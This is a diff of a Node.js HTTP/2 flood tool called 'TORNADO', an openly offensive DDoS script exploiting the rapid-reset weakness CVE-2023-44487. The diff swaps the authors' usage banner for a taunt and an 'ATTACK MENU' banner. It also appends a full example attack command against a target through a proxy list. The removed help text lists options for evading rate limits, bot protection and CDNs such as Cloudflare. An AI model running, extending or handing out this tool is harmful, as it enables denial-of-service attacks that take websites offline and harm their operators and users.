@@ -1,4 +1,3 @@
-// made by @rapidreset aka mitigations for mesh botnet
 const net = require('net');
 const tls = require('tls');
 const HPACK = require('hpack');
@@ -84,27 +83,7 @@ const debugMode = process.argv.includes('--debug') && forceHttp != 1;
 
 if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
     console.clear();
-    console.error(`
-    TORNADO v2.1 Method With RST STREAM (CVE-2023-44487) // Updated: 01.05.2024 // With love @resetcve
-    Developers to method: @resetcve - developer method // @shiftwise - recoding method
-    How to use & example:
-      node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
-      node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
-    
-    Options:
-      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
-      --delay <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
-      --cookie "f=f" - for custom cookie - also cookie support %RAND% ex: "bypassing=%RAND%"
-      --bfm true/null - bot fight mode change to true if you need dont use if no need
-      --referer https://target.com / rand - use custom referer if you need and rand - if you need generate domains ex: fwfwwfwfw.net
-      --postdata "user=f&pass=%RAND%" - if you need data to post req method format "user=f&pass=f"
-      --randrate - randomizer rate 1 to 90 good bypass to rate
-      --full - this new func for attack only big backend ex amazon akamai and other... support cf
-      --http 1/2/mix - new func choose to type http 1/2/mix (mix 1 & 2)
-      --debug - show your status code (maybe low rps to use more resource)
-      --header "f:f" or "f:f#f1:f1" - if you need this use custom headers split each header with #
-      --legit - this new func for attack with full legit headers non for cf
-    `);
+    console.error(`You can't copy me Mr. Skid :L (t.me/Op_TakeDown)`);
     process.exit(1);
 }
 
@@ -700,7 +679,14 @@ if (cluster.isMaster) {
     const workers = {}
 
     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
-    console.log(`Attack Start / @rapidreset love you <3 / TORNADO v1.5 (Beta Version)`);
+    console.log(`  
+    _____      __   ___
+    |_   _|__ _ \ \ / (_)_ _ _  _ ___
+      | |/ _ \ '_\ V /| | '_| || (_-<
+      |_|\___/_|  \_/ |_|_|  \_,_/__/ 
+      
+       🚨  LAYER7 ATTACK MENU  🚨
+         (Top-secret Protocols)`);
 
     cluster.on('exit', (worker) => {
         cluster.fork({ core: worker.id % os.cpus().length });
@@ -761,3 +747,5 @@ if (cluster.isMaster) {
 
     setTimeout(() => process.exit(1), time * 1000);
 }
+
+// node TOR.js GET "https://target.com?q=%RAND%" 120 16 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
